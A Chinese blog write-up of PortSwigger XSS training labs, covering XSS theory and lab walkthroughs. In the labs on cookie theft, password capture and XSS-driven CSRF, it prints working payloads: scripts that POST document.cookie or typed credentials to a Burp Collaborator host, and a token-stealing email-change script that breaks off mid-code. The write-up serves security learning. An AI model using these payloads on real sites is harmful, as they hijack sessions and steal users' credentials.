# 原创
：  【burpsuite安全练兵场-客户端11】跨站点脚本XSS-20个实验（上）

# 【burpsuite安全练兵场-客户端11】跨站点脚本XSS-20个实验（上）

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）HTML标记之间的XSS（√）
（2）HTML标记属性中的XSS（√）
（3）从其他数据库表中检索数据（√）
（4）客户端模板注入（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

---


**目录**

[一、跨站点脚本（XSS）](#%E4%B8%80%E3%80%81%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%EF%BC%88XSS%EF%BC%89)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、原理：](#2%E3%80%81%E5%8E%9F%E7%90%86%EF%BC%9A)

[3、XSS验证](#3%E3%80%81XSS%E9%AA%8C%E8%AF%81)

[3、XSS攻击类型](#3%E3%80%81XSS%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B)

[二、反射XSS](#%E4%BA%8C%E3%80%81%E5%8F%8D%E5%B0%84XSS)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、示例：](#2%E3%80%81%E7%A4%BA%E4%BE%8B%EF%BC%9A)

[3、涉及实验：](#3%E3%80%81%E6%B6%89%E5%8F%8A%E5%AE%9E%E9%AA%8C%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%EF%BC%8C%E4%B8%8D%E8%BF%9B%E8%A1%8C%E4%BB%BB%E4%BD%95%E7%BC%96%E7%A0%81)[实验1：将XSS反射到HTML上下文中，不进行任何编码](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%EF%BC%8C%E4%B8%8D%E8%BF%9B%E8%A1%8C%E4%BB%BB%E4%BD%95%E7%BC%96%E7%A0%81)

[4、反射的XSS攻击的影响](#4%E3%80%81%E5%8F%8D%E5%B0%84%E7%9A%84XSS%E6%94%BB%E5%87%BB%E7%9A%84%E5%BD%B1%E5%93%8D)

[        ](#%E5%AE%9E%E9%AA%8C14%EF%BC%9A%E5%88%A9%E7%94%A8%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E7%AA%83%E5%8F%96Cookie)[实验14：利用跨站点脚本窃取Cookie](#%E5%AE%9E%E9%AA%8C14%EF%BC%9A%E5%88%A9%E7%94%A8%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E7%AA%83%E5%8F%96Cookie)

[        ](#%E5%AE%9E%E9%AA%8C15%EF%BC%9A%E5%88%A9%E7%94%A8%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E6%9D%A5%E6%8D%95%E8%8E%B7%E5%AF%86%E7%A0%81)[实验15：利用跨站点脚本来捕获密码](#%E5%AE%9E%E9%AA%8C15%EF%BC%9A%E5%88%A9%E7%94%A8%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E6%9D%A5%E6%8D%95%E8%8E%B7%E5%AF%86%E7%A0%81)

[        ](#%E5%AE%9E%E9%AA%8C16%EF%BC%9A%E5%88%A9%E7%94%A8XSS%E5%AE%9E%E7%8E%B0CSRF)[实验16：利用XSS实现CSRF](#%E5%AE%9E%E9%AA%8C16%EF%BC%9A%E5%88%A9%E7%94%A8XSS%E5%AE%9E%E7%8E%B0CSRF)

[三、不同上下文中的反射XSS](#%E4%B8%89%E3%80%81%E4%B8%8D%E5%90%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84XSS)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、HTML标记之间的XSS](#2%E3%80%81HTML%E6%A0%87%E8%AE%B0%E4%B9%8B%E9%97%B4%E7%9A%84XSS)

[        ](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E5%B0%86XSS%E5%AD%98%E5%82%A8%E5%88%B0HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%EF%BC%8C%E4%B8%8D%E8%BF%9B%E8%A1%8C%E4%BB%BB%E4%BD%95%E7%BC%96%E7%A0%81)[实验2：将XSS存储到HTML上下文中，不进行任何编码](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E5%B0%86XSS%E5%AD%98%E5%82%A8%E5%88%B0HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%EF%BC%8C%E4%B8%8D%E8%BF%9B%E8%A1%8C%E4%BB%BB%E4%BD%95%E7%BC%96%E7%A0%81)

[        ](#%E5%AE%9E%E9%AA%8C17%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%EF%BC%8C%E5%A4%A7%E5%A4%9A%E6%95%B0%E6%A0%87%E8%AE%B0%E5%92%8C%E5%B1%9E%E6%80%A7%E8%A2%AB%E9%98%BB%E6%AD%A2)[实验17：将XSS反射到HTML上下文中，大多数标记和属性被阻止](#%E5%AE%9E%E9%AA%8C17%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%EF%BC%8C%E5%A4%A7%E5%A4%9A%E6%95%B0%E6%A0%87%E8%AE%B0%E5%92%8C%E5%B1%9E%E6%80%A7%E8%A2%AB%E9%98%BB%E6%AD%A2)

[        ](#%E5%AE%9E%E9%AA%8C18%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%EF%BC%8C%E9%99%A4%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E8%AE%B0%E5%A4%96%EF%BC%8C%E6%89%80%E6%9C%89%E6%A0%87%E8%AE%B0%E9%83%BD%E8%A2%AB%E9%98%BB%E6%AD%A2)[实验18：将XSS反射到HTML上下文中，除自定义标记外，所有标记都被阻止](#%E5%AE%9E%E9%AA%8C18%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%EF%BC%8C%E9%99%A4%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E8%AE%B0%E5%A4%96%EF%BC%8C%E6%89%80%E6%9C%89%E6%A0%87%E8%AE%B0%E9%83%BD%E8%A2%AB%E9%98%BB%E6%AD%A2)

[        ](#%E5%AE%9E%E9%AA%8C25%EF%BC%9A%E5%85%B7%E6%9C%89%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F%E5%92%8C%20href%20%E5%B7%B2%E9%98%BB%E6%AD%A2%E5%B1%9E%E6%80%A7)[实验25：具有事件处理程序和 href 已阻止属性](#%E5%AE%9E%E9%AA%8C25%EF%BC%9A%E5%85%B7%E6%9C%89%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F%E5%92%8C%20href%20%E5%B7%B2%E9%98%BB%E6%AD%A2%E5%B1%9E%E6%80%A7)

[        ](#%E5%AE%9E%E9%AA%8C19%EF%BC%9A%E5%85%81%E8%AE%B8%E4%BD%BF%E7%94%A8%E4%B8%80%E4%BA%9BSVG%E6%A0%87%E8%AE%B0%E7%9A%84%E5%8F%8D%E5%B0%84XSS)[实验19：允许使用一些SVG标记的反射XSS](#%E5%AE%9E%E9%AA%8C19%EF%BC%9A%E5%85%81%E8%AE%B8%E4%BD%BF%E7%94%A8%E4%B8%80%E4%BA%9BSVG%E6%A0%87%E8%AE%B0%E7%9A%84%E5%8F%8D%E5%B0%84XSS)

[3、HTML标记属性中的XSS](#3%E3%80%81HTML%E6%A0%87%E8%AE%B0%E5%B1%9E%E6%80%A7%E4%B8%AD%E7%9A%84XSS)

[        ](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0%E5%B8%A6%E5%B0%96%E6%8B%AC%E5%8F%B7%E7%9A%84HTML%E7%BC%96%E7%A0%81%E5%B1%9E%E6%80%A7%E4%B8%AD)[实验7：将XSS反射到带尖括号的HTML编码属性中](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0%E5%B8%A6%E5%B0%96%E6%8B%AC%E5%8F%B7%E7%9A%84HTML%E7%BC%96%E7%A0%81%E5%B1%9E%E6%80%A7%E4%B8%AD)

[        ](#%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E5%B0%86XSS%E5%AD%98%E5%82%A8%E5%88%B0%E9%94%9A%E4%B8%AD%20href%20%E5%B8%A6%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9A%84%E5%B1%9E%E6%80%A7HTML%E7%BC%96%E7%A0%81)[实验8：将XSS存储到锚中 href 带双引号的属性HTML编码](#%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E5%B0%86XSS%E5%AD%98%E5%82%A8%E5%88%B0%E9%94%9A%E4%B8%AD%20href%20%E5%B8%A6%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9A%84%E5%B1%9E%E6%80%A7HTML%E7%BC%96%E7%A0%81)

[        ](#%E5%AE%9E%E9%AA%8C20%EF%BC%9A%E8%A7%84%E8%8C%83%E9%93%BE%E6%8E%A5%E6%A0%87%E8%AE%B0%E4%B8%AD%E5%8F%8D%E5%B0%84%E7%9A%84XSS)[实验20：规范链接标记中反射的XSS](#%E5%AE%9E%E9%AA%8C20%EF%BC%9A%E8%A7%84%E8%8C%83%E9%93%BE%E6%8E%A5%E6%A0%87%E8%AE%B0%E4%B8%AD%E5%8F%8D%E5%B0%84%E7%9A%84XSS)

[4、终止现有脚本](#4%E3%80%81%E7%BB%88%E6%AD%A2%E7%8E%B0%E6%9C%89%E8%84%9A%E6%9C%AC)

[        ](#%E5%AE%9E%E9%AA%8C21%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0JavaScript%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%EF%BC%8C%E5%B9%B6%E4%BD%BF%E7%94%A8%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%E8%BF%9B%E8%A1%8C%E8%BD%AC%E4%B9%89)[实验21：将XSS反射到JavaScript字符串中，并使用单引号和反斜杠进行转义](#%E5%AE%9E%E9%AA%8C21%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0JavaScript%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%EF%BC%8C%E5%B9%B6%E4%BD%BF%E7%94%A8%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%E8%BF%9B%E8%A1%8C%E8%BD%AC%E4%B9%89)

[        ](#%E5%AE%9E%E9%AA%8C9%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0%E5%B8%A6%E6%9C%89%E5%B0%96%E6%8B%AC%E5%8F%B7%E7%9A%84JavaScript%E5%AD%97%E7%AC%A6%E4%B8%B2HTML%E7%BC%96%E7%A0%81)[实验9：将XSS反射到带有尖括号的JavaScript字符串HTML编码](#%E5%AE%9E%E9%AA%8C9%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0%E5%B8%A6%E6%9C%89%E5%B0%96%E6%8B%AC%E5%8F%B7%E7%9A%84JavaScript%E5%AD%97%E7%AC%A6%E4%B8%B2HTML%E7%BC%96%E7%A0%81)

[        ](#%E5%AE%9E%E9%AA%8C22%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0JavaScript%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7HTML%E7%BC%96%E7%A0%81%E5%B9%B6%E8%BD%AC%E4%B9%89%E5%8D%95%E5%BC%95%E5%8F%B7)[实验22：将XSS反射到JavaScript字符串中，使用尖括号和双引号HTML编码并转义单引号](#%E5%AE%9E%E9%AA%8C22%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0JavaScript%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7HTML%E7%BC%96%E7%A0%81%E5%B9%B6%E8%BD%AC%E4%B9%89%E5%8D%95%E5%BC%95%E5%8F%B7)

[        ](#%E5%AE%9E%E9%AA%8C26%EF%BC%9AJavaScript%20URL%E4%B8%AD%E5%8F%8D%E5%B0%84%E7%9A%84XSS%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%AD%97%E7%AC%A6%E8%A2%AB%E9%98%BB%E6%AD%A2)[实验26：JavaScript URL中反射的XSS，其中一些字符被阻止](#%E5%AE%9E%E9%AA%8C26%EF%BC%9AJavaScript%20URL%E4%B8%AD%E5%8F%8D%E5%B0%84%E7%9A%84XSS%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%AD%97%E7%AC%A6%E8%A2%AB%E9%98%BB%E6%AD%A2)

[        ](#%E5%AE%9E%E9%AA%8C23%EF%BC%9A%E5%B0%86XSS%E5%AD%98%E5%82%A8%E5%88%B0onclick%E4%BA%8B%E4%BB%B6%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7HTML%E7%BC%96%E7%A0%81%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%E8%BD%AC%E4%B9%89)[实验23：将XSS存储到onclick事件中，使用尖括号和双引号HTML编码，使用单引号和反斜杠转义](#%E5%AE%9E%E9%AA%8C23%EF%BC%9A%E5%B0%86XSS%E5%AD%98%E5%82%A8%E5%88%B0onclick%E4%BA%8B%E4%BB%B6%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7HTML%E7%BC%96%E7%A0%81%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%E8%BD%AC%E4%B9%89)

[        ](#%E5%AE%9E%E9%AA%8C24%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0%E6%A8%A1%E6%9D%BF%E6%96%87%E6%9C%AC%E4%B8%AD%EF%BC%8C%E5%B8%A6%E6%9C%89%E5%B0%96%E6%8B%AC%E5%8F%B7%E3%80%81%E5%8D%95%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8C%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8D%E6%96%9C%E6%9D%A0%E5%92%8C%E5%8F%8D%E8%AE%B0%E5%8F%B7)[实验24：将XSS反射到模板文本中，带有尖括号、单引号、双引号、反斜杠和反记号](#%E5%AE%9E%E9%AA%8C24%EF%BC%9A%E5%B0%86XSS%E5%8F%8D%E5%B0%84%E5%88%B0%E6%A8%A1%E6%9D%BF%E6%96%87%E6%9C%AC%E4%B8%AD%EF%BC%8C%E5%B8%A6%E6%9C%89%E5%B0%96%E6%8B%AC%E5%8F%B7%E3%80%81%E5%8D%95%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8C%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8D%E6%96%9C%E6%9D%A0%E5%92%8C%E5%8F%8D%E8%AE%B0%E5%8F%B7)

[四、客户端模板注入](#%E5%9B%9B%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[ 2、AngularJS沙盒](#%C2%A02%E3%80%81AngularJS%E6%B2%99%E7%9B%92)

[        ](#%E5%AE%9E%E9%AA%8C27%EF%BC%9A%E5%8F%8D%E5%B0%84%E7%9A%84XSS%EF%BC%8C%E5%B8%A6AngularJS%E6%B2%99%E7%AE%B1%E8%BD%AC%E4%B9%89%EF%BC%8C%E4%B8%8D%E5%B8%A6%E5%AD%97%E7%AC%A6%E4%B8%B2)[实验27：反射的XSS，带AngularJS沙箱转义，不带字符串](#%E5%AE%9E%E9%AA%8C27%EF%BC%9A%E5%8F%8D%E5%B0%84%E7%9A%84XSS%EF%BC%8C%E5%B8%A6AngularJS%E6%B2%99%E7%AE%B1%E8%BD%AC%E4%B9%89%EF%BC%8C%E4%B8%8D%E5%B8%A6%E5%AD%97%E7%AC%A6%E4%B8%B2)

[ 3、AngularJS CSP旁路](#%C2%A03%E3%80%81AngularJS%20CSP%E6%97%81%E8%B7%AF)

[ ](#%C2%A0%E5%AE%9E%E9%AA%8C28%EF%BC%9A%E5%8F%8D%E5%B0%84XSS%E4%B8%8EAngularJS%E6%B2%99%E7%AE%B1%E8%BD%AC%E4%B9%89%E5%92%8CCSP)[        ](#%C2%A0%E5%AE%9E%E9%AA%8C28%EF%BC%9A%E5%8F%8D%E5%B0%84XSS%E4%B8%8EAngularJS%E6%B2%99%E7%AE%B1%E8%BD%AC%E4%B9%89%E5%92%8CCSP)[实验28：反射XSS与AngularJS沙箱转义和CSP](#%C2%A0%E5%AE%9E%E9%AA%8C28%EF%BC%9A%E5%8F%8D%E5%B0%84XSS%E4%B8%8EAngularJS%E6%B2%99%E7%AE%B1%E8%BD%AC%E4%B9%89%E5%92%8CCSP)

---


## 一、跨站点脚本（XSS）

> 
<h3>1、简述：</h3>
1、跨站点脚本（也称为XSS）是一个Web安全漏洞，使得攻击者能够破坏用户与易受攻击的应用程序的交互。它允许攻击者绕过同源策略，该策略旨在将不同的网站彼此隔离。跨站点脚本漏洞通常允许攻击者伪装成受害用户，执行用户能够执行的任何操作，以及访问用户的任何数据。如果受害用户拥有应用程序内的特权访问权限，则攻击者可能能够完全控制应用程序的所有功能和数据 <br/>  
<hr/>
<h3>2、原理：</h3>
操纵易受攻击的网站，以便向用户返回恶意JavaScript。当恶意代码在受害者的浏览器中执行时，攻击者可以完全破坏其与应用程序的交互


### 2、原理：

> 
<h3>3、XSS验证</h3>
1、通过注入一个有效负载来确认大多数类型的XSS漏洞，该有效负载会导致浏览器执行某些任意JavaScript。使用alert()函数，因为它简短、无害，并且在成功调用时很难错过。实际上，大多数XSS实验都是通过调用alert()在模拟受害者的浏览器
<hr/>
2、如果使用Chrome的话，会有一个问题。从2021年7月开始，跨源iframe被禁止调用alert（）。由于这些用于构造一些更高级的XSS攻击，因此有时需要使用替代PoC有效负载。在这种情况下，建议使用print（）函数


> 
<h3>3、XSS攻击类型</h3>
主要有三种类型：
<pre><code>    1、反射的XSS，其中恶意脚本来自当前HTTP请求。
    2、存储XSS，其中恶意脚本来自网站的数据库。
    3、基于DOM的XSS，其中漏洞存在于客户端代码而不是服务器端代码中。
</code></pre>


---


---


## 二、反射XSS

> 
<h3>1、简述：</h3>
当应用程序接收HTTP请求中的数据并以不安全的方式将该数据包含在即时响应中时，就会出现反射的跨站点脚本（或XSS）
<hr/>
<h3>2、示例：</h3>
<pre><code>1、（插入框）网站具有搜索功能，该功能接收用户在URL参数中提供的搜索项：
https://insecure-website.com/search?term=gift

2、（回显功能）应用产品在对此URL的响应中回显提供的搜索词：
&lt;p&gt;You searched for: gift&lt;/p&gt;

3、（数据处理不严谨/可绕过）假设应用程序不执行任何其他数据处理，攻击者可以构建如下攻击：
https://insecure-website.com/search?term=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;

4、（反射XSS）此URL将导致以下响应：
&lt;p&gt;You searched for: &lt;script&gt;/* Bad stuff here... */&lt;/script&gt;&lt;/p&gt;</code></pre> 如果应用程序的另一个用户请求攻击者的URL，则攻击者提供的脚本将在受害用户的浏览器中，在他们与应用程序的会话上下文中执行 
 <hr/>
<h3>3、涉及实验：</h3>
实验1：将XSS反射到HTML上下文中，不进行任何编码


### 2、示例：

---


> 
<h3>实验1：将XSS反射到HTML上下文中，不进行任何编码</h3>
信息：
本实验包含搜索功能中的一个简单反映的跨站点脚本漏洞。
完成实验：执行调用alert函数的跨站点脚本攻击。
<hr/>
part1:
（自己储备好各种XSS的payload）
见框就插（有时候可能会在数据包里面插）
<pre>`&lt;script&gt;alert(1)&lt;/script&gt;`</pre>

<img alt="" height="595" src="https://img-blog.csdnimg.cn/de5678444a82434390e1e9b7dee69a30.png" width="944"/> <img alt="" height="404" src="https://img-blog.csdnimg.cn/f057dc0930a4490db5ae67d162079af3.png" width="1200"/>



> 
<h3>4、反射的XSS攻击的影响</h3>
1、如果攻击者可以控制在受害者浏览器中执行的脚本，则通常可以完全危害该用户。
<pre><code>攻击者可以：
    1、在应用程序中执行用户可以执行的任何操作。
    2、查看用户能够查看的任何信息。
    3、修改用户能够修改的任何信息。
    4、发起与其他应用程序用户的交互，包括恶意攻击，这些攻击看起来似乎来自最初的受害者用户。</code></pre>
2、攻击者可以通过各种方式诱使受害用户发出他们控制的请求，从而传递反射的XSS攻击。这包括在攻击者控制的网站或允许生成内容的其他网站上放置链接，或者通过电子邮件、推文或其他消息发送链接。攻击可能直接针对已知用户，也可能不加区别地攻击应用程序的任何用户
<hr/>
3、攻击需要外部传递机制，这意味着反射的XSS的影响通常没有存储的XSS严重，存储的XSS可以在易受攻击的应用程序本身内传递自包含攻击。 
<hr/>
4、利用跨站点脚本窃取Cookie
<pre><code>窃取cookie是利用XSS的传统方式。大多数Web应用程序使用Cookie进行会话处理。可以利用跨站点脚本漏洞将受害者的Cookie发送到您自己的域，然后手动将Cookie注入浏览器并模拟受害者。

在实践中，这种方法有一些明显的局限性：
    1、受害者可能没有登录。
    2、许多应用程序使用 仅HttpOnly旗帜。
    3、会话可能会被锁定到其他因素，如用户的IP地址。
    4、会话可能会在您能够劫持它之前超时</code></pre>
涉及实验：<br/> 实验14：利用跨站点脚本窃取Cookie
<hr/>
5、利用跨站点脚本来捕获密码
————
（1）许多用户都有自动填充密码的密码管理器。可以通过创建密码输入、阅读自动填充的密码并将其发送到我们的域来利用这一点。此技术避免了与窃取Cookie相关的大多数问题，甚至可以访问受害者重用相同密码的所有其他帐户。
————
（2）这种技术的主要缺点是，它只适用于拥有执行密码自动填充的密码管理器的用户。(如果用户没有保存密码，仍然可以尝试通过现场网络钓鱼攻击获取其密码） 
————
涉及实验：<br/> 实验15：利用跨站点脚本来捕获密码
<hr/>
6、利用跨站点脚本执行CSRF
————
1、根据目标网站，可能会让受害者发送消息，接受好友请求，提交一个后门到源代码库，或转移一些比特币。
————
2、某些网站允许登录用户更改其电子邮件地址，而无需重新输入密码。如果发现了XSS漏洞，可以让它触发此功能，将受害者的电子邮件地址更改为能控制的地址，然后触发密码重置以获得对帐户的访问权限
————
3、这种类型的利用通常称为跨站点请求伪造（CSRF），这有点令人困惑，因为CSRF也可能作为独立漏洞出现。当CSRF作为独立漏洞出现时，可以使用诸如反CSRF令牌之类的策略对其进行修补。但如果同时存在XSS漏洞，这些策略将不提供任何保护。 
————
涉及实验：<br/> 实验16：利用XSS实现CSRF


---


---


> 
<h3>实验14：利用跨站点脚本窃取Cookie</h3>
信息：
本实验在博客评论函数中包含一个已存储的XSS漏洞。模拟的受害者用户查看所有发表的评论
解决实验：利用此漏洞来泄漏受害者的会话cookie，然后使用此cookie来模拟受害者
<hr/>
part1:
使用Burp Suite Professional，转到Collaborator选项卡。<br/> 单击“复制到剪贴板”将唯一的Burp Collaborator有效负载复制到剪贴板
<pre>`jg3vbb0cmdrxsi0uyp9h9lc47vdl1a.burpcollaborator.net`</pre>


<hr/>
part2:
插入XSS
在博客评论中提交以下有效负载，在指定位置插入您的Burp Collaborator子域：
<pre><code>&lt;script&gt;
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
&lt;/script&gt;


我的是：
&lt;script&gt;
fetch('https://jg3vbb0cmdrxsi0uyp9h9lc47vdl1a.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
&lt;/script&gt;</code></pre>
此脚本将使查看评论的任何人向公共Collaborator服务器上的您的子域发出包含其cookie的POST请求<br/><img alt="" height="839" src="https://img-blog.csdnimg.cn/0ec870f7e350497baaaf05259c609551.png" width="1200"/>

<br/>  
<hr/>
part3：
查看信息
点击刷新，看到HTTP交互<br/> 记下POST主体中受害者cookie的值
<pre>`session=9Npstu0CedDyYYZvFUNgA0okHLfpWyYB`</pre>




<hr/>
part4：
解决实验
重新加载主博客页面，使用Burp Proxy或Burp Repeater将会话cookie替换为在Burp Collaborator中捕获的cookie

其实正常情况下，修改某个数据，可能就要一路修改下去

 <img alt="" height="439" src="https://img-blog.csdnimg.cn/9cb86df2b32049c585860a88d9989a4e.png" width="1200"/>



---


---


> 
<h3>实验15：利用跨站点脚本来捕获密码</h3>
信息：
本实验在博客评论函数中包含一个已存储的XSS漏洞。模拟的受害者用户查看所有发表的评论
解决实验：利用此漏洞来窃取受害者的用户名和密码，然后使用这些凭据登录到受害者的帐户。
<hr/>
part1:
使用Burp Suite Professional，转到Collaborator选项卡。<br/> 单击"复制到剪贴板"将唯一的Burp Collaborator有效负载复制到剪贴板
<pre>`qqkybew56kd84w6ny0l6yjhpfgl69v.burpcollaborator.net`</pre>


<hr/>
part2:
插入XSS
在博客评论中提交以下有效负载（在指定位置插入您的Burp Collaborator子域）
<pre><code>&lt;input name=username id=username&gt;
&lt;input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"&gt;

我的是：
&lt;input name=username id=username&gt;
&lt;input type=password name=password onchange="if(this.value.length)fetch('https://qqkybew56kd84w6ny0l6yjhpfgl69v.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"&gt;</code></pre>
此脚本将使查看评论的任何人向公共Collaborator服务器的子域发出包含其用户名和密码的POST请求


<hr/>
part3：
返回Collaborator选项卡，然后刷新，看到HTTP交互<br/> 记下POST主体中受害者的用户名和密码的值。
<pre>`administrator:9yl3ow6km9ix24rkz7mk`</pre>


<hr/>
part4：
解决实验
进行登陆操作
<img alt="" height="722" src="https://img-blog.csdnimg.cn/c77df84426b04d24a800aea3c62f1166.png" width="1200"/> 登陆成功完成实验



---


---


> 
<h3>实验16：利用XSS实现CSRF</h3>
信息：
本实验在博客评论函数中包含一个已存储的XSS漏洞。要解决此实验问题，请利用此漏洞执行CSRF攻击，并更改查看博客帖子评论的用户的电子邮件地址。
已有账号：wiener:peter
<hr/>
part1:
登陆已有账号测试功能

在HTTP历史记录中找到数据包


<hr/>
part2：
构造XSS
攻击需要加载用户帐户页面，提取CSRF令牌，然后使用该令牌更改受害者的电子邮件地址
<pre><code>&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
